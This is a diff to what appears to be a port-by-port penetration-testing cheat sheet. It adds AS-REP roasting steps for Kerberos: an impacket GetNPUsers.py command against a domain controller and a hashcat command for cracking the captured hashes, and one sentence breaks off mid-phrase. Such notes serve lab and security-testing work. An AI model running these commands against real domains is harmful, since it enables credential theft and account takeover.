@@ -213,12 +213,18 @@ gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/wordlists/Secli
 
 #### 88: Kerberos
 
-Kerberos on 88 usually fingers a Windows Domain Controller.
-
-Check out MS14-068.
+The main way to attack remotely is to asreproast, look for acccounts with UF_DONT_REQUIRE_PREAUTH set that give us the.
 
 ```
-See Windows page for Kerberos attackts
+python /opt/impacket/examples/GetNPUsers.py DOMAIN.LOCAL/ -dc-ip 10.10.10.10 -no-pass -usersfile wordlist
+
+Then crack with
+
+hashcat -m 18200 --force -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt
+```
+
+```
+See Windows page for more Kerberos attackts
 ```
 
 #### 110/995: POP3
